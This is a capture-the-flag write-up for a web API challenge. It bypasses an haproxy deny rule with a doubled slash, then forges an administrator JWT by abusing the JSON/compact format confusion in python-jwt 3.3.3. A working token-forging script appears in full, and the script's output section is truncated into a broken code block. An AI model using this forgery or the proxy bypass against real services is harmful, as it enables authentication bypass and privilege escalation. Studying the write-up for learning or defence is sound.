## Web Site

![Alt text](images/image.png)

The web site is a documentation page for an API.


## `haproxy`

[`conf/haproxy.cfg`](conf/haproxy.cfg)

haproxy is used as a reverse proxy and there is a `http-request deny` rule for `/api/v1/get_ticket`:

```
http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }
```

When we try to execute the `GET /api/v1/get_ticket` request we get:

### Bypassing `haproxy`

![Alt text](images/image-1.png)

If we try to access the API endpoint directly and manipulate the URL with a extra `/` we can bypass the `haproxy` rule:

```
http://94.237.58.155:57483//api/v1/get_ticket
```

```json
{
    "ticket: ": "eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA0MTA3OTksImlhdCI6MTcxMDQwNzE5OSwianRpIjoidWltSkd6Z3VmeXpqMnczT1l3UTVSUSIsIm5iZiI6MTcxMDQwNzE5OSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.Somq4HqjlowSFEGbTWlL0Pds7wx8aiwwA3IYDXoB0unKY0ik7nCPjMKOqNc4PUjYC1uYY4l-DUOtmEwcFvEuRa52Ksbr2kd2e4DR3Sz0_UVetTIGHv9Qwx95jeR7gvWb7yWNqyCrgyXWbo-GiYsFpAxIyyWmt4vW22tow9B_WO4Z1SiD0jln-dOtimcEOiF954YpbZGHNHBu5j2ZvVG1ei9rQFVeGJKRDw-ppbQTWRGF1Y3v794k4PAfKjXVQ0c4c2a8KE8FtevJPeGXPBZs0RqpU7m5yDqlBx59OzZRnq01zlXNZYEiaURymBaBSFP3o4LNj2QUSYq7sUgnpK3G_Q"
}
```

Nice! Now we have a JWT token!


## Testing The API

### `/api/v1/flag`

![Alt text](images/image-3.png)

Seems like we are identified as a guest user and we don't have access to the flag.

### `/api/v1/chat/{chatId}`

![Alt text](images/image-4.png)

We have access to the chat API! Let's have a look.


## Chat

```json

    }
  ]
}
```

These chats are basically decoys and doesn't contain any useful information.


## LFI?

I got side-tracked and started looking for a LFI vulnerabilities in the API based on the following code:

```python
@api_blueprint.route('/chat/<int:chat_id>', methods=['GET'])
@authorize_roles(['guest', 'administrator'])
def chat(chat_id):

    json_file_path = os.path.join(JSON_DIR, f"{chat_id}.json")

    if os.path.exists(json_file_path):
        with open(json_file_path, 'r') as f:
            chat_data = json.load(f)
        
        chat_id = chat_data.get('chat_id', None)
        
        return jsonify({'chat_id': chat_id, 'messages': chat_data['messages']})
    else:
        return jsonify({'error': 'Chat not found'}), 404
```

I was trying to figure out if there was a way to bypass the `<int:chat_id>` rule in `@api_blueprint.route('/chat/<int:chat_id>', methods=['GET'])` and then manipulate the `f"{chat_id}.json"` to read other files on the server.

I could not find a way to bypass the `<int:chat_id>` rule and I did not find any LFI vulnerabilities.


## JWT Token Vulnerability

When I saw the API documentation website my instant thought was that this was going to be a JWT token vulnerability challenge.

I tried a lot of manipulation with the JWT token but I could not get the API to accept it.

I spent a lot of time doing research and trying tools like: `jwt_tool` as well as more manual methods.


### `python-jwt`

Then I started looking closer into the `python-jwt` library.

https://pypi.org/project/python-jwt/

![Alt text](images/image-6.png)

I noticed that the version used in the challenge is `3.3.3` and the latest version is `3.3.4`.

From `requirements.txt`:

```
uwsgi
Flask
requests
python_jwt==3.3.3
```

Version `3.3.3` has a vulnerability which let's us generate a token with arbitrary claims and a signature from another valid token.

The fix for this vulnerability can be found here: https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9

> ```
> FIX VULNERABILITY
> jwcrypto accepts both compact and JSON formats.
> It was possible to use this to present a token with arbitrary
> claims with a signature from another valid token.
> 
> See test/vulnerability_vows.py for an example.
> ```

And here is a test case for the vulnerability:
https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9#diff-f3fb6499354e6fd16cb955d1f54138fa3481148f3f095467958b60b3835f3a50

Based on the test case, we can make a script to generate a token with arbitrary claims and a signature from another valid token.

Script here: [`faketoken.py`](faketoken.py)

```python
from json import dumps, loads
from jwcrypto.common import base64url_decode, base64url_encode

""" Make a forged token """
""" Use mix of JSON and compact format to insert forged claims including long expiration """

# The valid token for the guest user
[header, payload, signature] = 'eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA0MTQ1NDEsImlhdCI6MTcxMDQxMDk0MSwianRpIjoiRXFYa1JlM0taVm5MY2tmUG13VVpJUSIsIm5iZiI6MTcxMDQxMDk0MSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.dindR6sdLUdJD7Q6y-Ut8XDx0-XTVKGDzI1YVd-7fMkFydE4M-8O4cltoh6KjmiArJNQrkf1cTzFgT0I6hNC0apMMz7f350e7ph5_0DWONnkuFvSuUxkVvsYwm-OuKIIW3NA2U0pGR7xJphGedcwLKel1IaR-XA9bLox4Xo96Nf_XeGn_NuOfKsKhtha5jjPYfcsxoPjpFiQvnWyupM5Tpg7ySUY3lM4c2fuRImdpejzpVqJfD9B0NAfOAw6dUalvoU_LCZYkzluOIncszohluDAGXOIwvK_2c4B0zTUanDcMYxmHIUGfXGQ07-7DGXoC5bnubVQYkr3x_QcNfUdug'.split('.')

parsed_payload = loads(base64url_decode(payload))

# Set the role to administrator
parsed_payload['role'] = 'administrator'

# Create the token
fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))

print('{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}')
```

```bash
$ python3 faketoken.py

## Flag

Now let's use this forged token on the `/api/v1/flag` endpoint:

![Alt text](images/image-5.png)

```
HTB{h4Pr0Xy_n3v3r_D1s@pp01n4s}
```
